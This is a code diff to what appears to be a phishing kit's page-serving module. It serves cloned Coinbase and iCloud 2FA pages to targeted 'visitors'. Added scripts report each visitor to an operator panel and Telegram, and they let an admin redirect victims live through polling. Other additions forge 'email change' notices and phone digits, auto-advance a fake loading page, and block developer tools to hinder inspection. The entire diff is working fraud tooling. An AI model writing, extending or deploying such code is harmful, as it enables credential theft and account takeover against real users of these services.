@@ -14,6 +14,7 @@ import { readFileSync, existsSync } from 'node:fs';
 import { resolve, join } from 'node:path';
 import { findTemplate, VISITOR_TEMPLATES } from '$lib/visitorTemplates';
 import { SKIP_GENERIC_WIRING } from './funnel';
+import { dbGetSetting } from './database.js';
 
 export { findTemplate, VISITOR_TEMPLATES };
 export type { VisitorTemplate } from '$lib/visitorTemplates';
@@ -60,6 +61,126 @@ const MOBILE_SCROLL_SHIM = `<style data-injected="visitor-mobile-scroll-fix">
   }
 }
 </style>`;
+
+/**
+ * Coinbase-specific mobile responsive fix.
+ *
+ * The captured pages use `w-md` (Tailwind custom: width 448px), `p-10`
+ * (40px padding), `mt-[100px]`, and `text-[26px]` which all overflow or
+ * waste space on phone screens (320-430px). This shim overrides them on
+ * viewports <= 640px so the card fills the screen, buttons stay
+ * reachable, and inputs don't trigger iOS auto-zoom.
+ */
+const COINBASE_MOBILE_FIX = `<style data-injected="coinbase-mobile-fix">
+@media (max-width: 640px) {
+  html, body {
+    overflow-x: hidden !important;
+  }
+
+  /* Card containers: release fixed width, shrink padding & top margin */
+  .w-md {
+    width: 100% !important;
+    max-width: 100% !important;
+    box-sizing: border-box !important;
+  }
+  .w-md.h-fit {
+    width: calc(100% - 24px) !important;
+    max-width: calc(100% - 24px) !important;
+    margin-left: 12px !important;
+    margin-right: 12px !important;
+  }
+  .mt-\\[100px\\] {
+    margin-top: 16px !important;
+  }
+  .p-10 {
+    padding: 20px !important;
+  }
+  .p-5 {
+    padding: 16px !important;
+  }
+
+  /* Typography: tighten headline so it doesn't wrap awkwardly */
+  .text-\\[26px\\] {
+    font-size: 22px !important;
+    line-height: 1.2 !important;
+  }
+  .text-\\[16px\\] {
+    font-size: 15px !important;
+  }
+
+  /* Asset / choice scroll lists */
+  .h-\\[300px\\] {
+    height: clamp(200px, 45vh, 340px) !important;
+  }
+
+  /* Buttons: iOS touch-target safe (48px min) */
+  .w-md button,
+  .w-md [role="button"] {
+    min-height: 48px !important;
+  }
+  .h-\\[55px\\] {
+    height: 52px !important;
+    min-height: 48px !important;
+  }
+  .h-\\[45px\\] {
+    height: 48px !important;
+    min-height: 44px !important;
+  }
+
+  /* Inputs: prevent iOS zoom on focus (needs >= 16px) */
+  .w-md input,
+  .w-md select,
+  .w-md textarea {
+    font-size: max(16px, 1em) !important;
+    min-height: 48px !important;
+  }
+
+  /* Full-screen overlay modals (Vault multi-step): keep fixed but
+     constrain inner card to viewport width */
+  div.fixed.w-screen[class*="h-screen"] .w-md {
+    width: calc(100% - 24px) !important;
+    max-width: calc(100% - 24px) !important;
+    margin-left: 12px !important;
+    margin-right: 12px !important;
+  }
+  div.fixed.w-screen[class*="h-screen"] .w-md.h-fit {
+    margin-top: 16px !important;
+  }
+
+  /* Choice cards / option rows: ensure they don't get too tight */
+  .w-md .min-h-\\[50px\\] {
+    min-height: 48px !important;
+    padding-top: 10px !important;
+    padding-bottom: 10px !important;
+  }
+
+  /* SVG logos: cap width so they don't overflow on very small screens */
+  .w-\\[126px\\] {
+    max-width: 110px !important;
+  }
+
+  /* Gap between stacked items */
+  .gap-2 {
+    gap: 6px !important;
+  }
+
+  /* Go-back button row */
+  .w-md .flex.flex-row.justify-between {
+    flex-wrap: wrap !important;
+  }
+}
+</style>`;
+
+function injectCoinbaseMobileFix(html: string): string {
+	if (html.includes('coinbase-mobile-fix')) return html;
+	const headClose = html.indexOf('</head>');
+	if (headClose === -1) {
+		const bodyOpen = html.indexOf('<body');
+		const insertAt = bodyOpen === -1 ? 0 : bodyOpen;
+		return html.slice(0, insertAt) + COINBASE_MOBILE_FIX + html.slice(insertAt);
+	}
+	return html.slice(0, headClose) + COINBASE_MOBILE_FIX + html.slice(headClose);
+}
 
 function injectMobileScrollFix(html: string): string {
 	if (html.includes('visitor-mobile-scroll-fix')) return html;
@@ -629,11 +750,106 @@ const PAGE_WIRINGS: Record<string, Record<string, unknown>> = {
 	'iCloud/2fa': { mode: 'code-inputs', codeLength: 6 }
 };
 
+function buildBrandPageScript(brand: string, page: string): string {
+	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
+	return `<script data-injected="visitor-brand-page">window.__rvBrandPage = ${bp};</script>`;
+}
+
 function buildAdvanceConfigScript(brand: string, page: string): string {
 	const wiring = PAGE_WIRINGS[`${brand}/${page}`] ?? { mode: 'auto' };
 	const cfg = JSON.stringify(wiring).replace(/</g, '\\u003c');
 	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
 	return `<script data-injected="visitor-advance-config">window.__rvWiring = ${cfg}; window.__rvBrandPage = ${bp};</script>`;
+}
+
+/** Registers visitor in panel + Telegram when a template page loads. */
+const CONNECT_SHIM = `<script data-injected="visitor-connect">
+(function () {
+  if (window.__rvConnectSent) return;
+  window.__rvConnectSent = true;
+  var bp = window.__rvBrandPage || {};
+  fetch('/api/visitor/connect', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      brand: bp.brand,
+      page: bp.page,
+      path: location.pathname,
+      host: location.hostname
+    }),
+    credentials: 'same-origin'
+  }).catch(function () {});
+  window.addEventListener('pagehide', function () {
+    try {
+      navigator.sendBeacon('/api/visitor/disconnect', new Blob(['{}'], { type: 'application/json' }));
+    } catch (e) {}
+  });
+})();
+</script>`;
+
+/** Polls for admin redirects and navigates the visitor when needed. */
+const SYNC_SHIM = `<script data-injected="visitor-sync">
+(function () {
+  if (window.__rvSyncReady) return;
+  window.__rvSyncReady = true;
+
+  var isPreview = location.pathname.startsWith('/templates/preview/');
+
+  function parseBrandPageFromPath() {
+    try {
+      var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
+      var idx = parts.indexOf('preview');
+      if (idx >= 0 && parts[idx + 1] && parts[idx + 2]) {
+        return { brand: parts[idx + 1], page: parts[idx + 2] };
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  function poll() {
+    var bp = window.__rvBrandPage;
+    if (!bp || !bp.brand || !bp.page) {
+      var parsed = parseBrandPageFromPath();
+      if (parsed) {
+        bp = parsed;
+        window.__rvBrandPage = bp;
+      }
+    }
+    if (!bp || !bp.brand || !bp.page) return;
+    var params = new URLSearchParams({ brand: bp.brand, page: bp.page });
+    params.set('isPreview', isPreview ? 'true' : 'false');
+    fetch('/api/visitor/sync?' + params.toString(), { credentials: 'same-origin' })
+      .then(function (r) { return r.json().catch(function () { return null; }); })
+      .then(function (data) {
+        if (!data || !data.redirectUrl) return;
+        var target = data.redirectUrl;
+        var currentPath = location.pathname;
+        var targetPath = target.split('?')[0];
+        if (targetPath !== currentPath) {
+          location.href = target;
+        }
+      })
+      .catch(function () {});
+  }
+
+  poll();
+  var intervalId = setInterval(poll, 2000);
+  window.addEventListener('pagehide', function () {
+    clearInterval(intervalId);
+  });
+})();
+</script>`;
+
+function injectConnectShim(html: string, brand: string, page: string): string {
+	if (html.includes('visitor-connect')) return html;
+	let payload = '';
+	if (!html.includes('__rvBrandPage')) {
+		payload += buildBrandPageScript(brand, page);
+	}
+	payload += CONNECT_SHIM + SYNC_SHIM;
+	const bodyClose = html.lastIndexOf('</body>');
+	if (bodyClose === -1) return html + payload;
+	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
 }
 
 function injectAdvanceShim(html: string, brand: string, page: string): string {
@@ -645,18 +861,101 @@ function injectAdvanceShim(html: string, brand: string, page: string): string {
 	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
 }
 
-export function loadTemplateHtml(brand: string, page: string): string | undefined {
+export interface TemplateOverrides {
+	lastTwoDigits?: string;
+	emailFrom?: string;
+	emailTo?: string;
+}
+
+function applyOverrides(html: string, overrides: TemplateOverrides): string {
+	if (overrides.lastTwoDigits) {
+		html = html.replace(/(<span\s+id="rv-phone">[^<]*?)(\d{2})(<\/span>)/, `$1${overrides.lastTwoDigits}$3`);
+	}
+	if (overrides.emailFrom) {
+		html = html.replace(
+			/(class="rv-from rv-mono">)[^<]*/,
+			`$1${overrides.emailFrom}`
+		);
+	}
+	if (overrides.emailTo) {
+		html = html.replace(
+			/(class="rv-to rv-mono">)[^<]*/,
+			`$1${overrides.emailTo}`
+		);
+		html = html.replace(
+			/Email change to [^'"<]+/g,
+			`Email change to ${overrides.emailTo}`
+		);
+	}
+	return html;
+}
+
+const DEVTOOLS_BLOCK_SHIM = `<script data-injected="disable-devtools">
+(function(){
+  document.addEventListener('contextmenu',function(e){e.preventDefault()});
+  document.addEventListener('keydown',function(e){
+    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='u'))e.preventDefault();
+  });
+})();
+</script>`;
+
+const LOADING_TIMER_SHIM = `<script data-injected="loading-timer">
+(function () {
+  if (window.__rvLoadingTimer) return;
+  window.__rvLoadingTimer = true;
+  var bp = window.__rvBrandPage || {};
+  setTimeout(function () {
+    fetch('/api/visitor/page-advance', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ brand: bp.brand || 'Coinbase', page: bp.page || 'Loading', choice: 'timer' })
+    }).then(function (r) { return r.json().catch(function () { return null; }); })
+      .then(function (d) {
+        if (d && d.nextUrl) location.href = d.nextUrl;
+      })
+      .catch(function () {});
+  }, 5000);
+})();
+</script>`;
+
+export function loadTemplateHtml(brand: string, page: string, overrides?: TemplateOverrides): string | undefined {
 	const t = findTemplate(brand, page);
 	if (!t) return undefined;
 	const file = join(TEMPLATE_ROOT, `${t.slug}.html`);
 	if (!existsSync(file)) return undefined;
 	let html = readFileSync(file, 'utf-8');
 	html = injectMobileScrollFix(html);
+	if (brand === 'Coinbase') {
+		html = injectCoinbaseMobileFix(html);
+	}
+	if (overrides) {
+		html = applyOverrides(html, overrides);
+	}
 	if (CASE_PAGE_NAMES.has(page)) {
 		html = injectCaseInputShim(html);
 	}
 	if (!SKIP_GENERIC_WIRING.has(`${brand}/${page}`) && !CASE_PAGE_NAMES.has(page)) {
 		html = injectAdvanceShim(html, brand, page);
 	}
+	html = injectConnectShim(html, brand, page);
+
+	if (page === 'Loading') {
+		const bodyClose = html.lastIndexOf('</body>');
+		if (bodyClose !== -1) {
+			html = html.slice(0, bodyClose) + LOADING_TIMER_SHIM + html.slice(bodyClose);
+		} else {
+			html += LOADING_TIMER_SHIM;
+		}
+	}
+
+	if (dbGetSetting('visitor.disable_devtools') === 'true') {
+		const bodyClose = html.lastIndexOf('</body>');
+		if (bodyClose !== -1) {
+			html = html.slice(0, bodyClose) + DEVTOOLS_BLOCK_SHIM + html.slice(bodyClose);
+		} else {
+			html += DEVTOOLS_BLOCK_SHIM;
+		}
+	}
+
 	return html;
 }
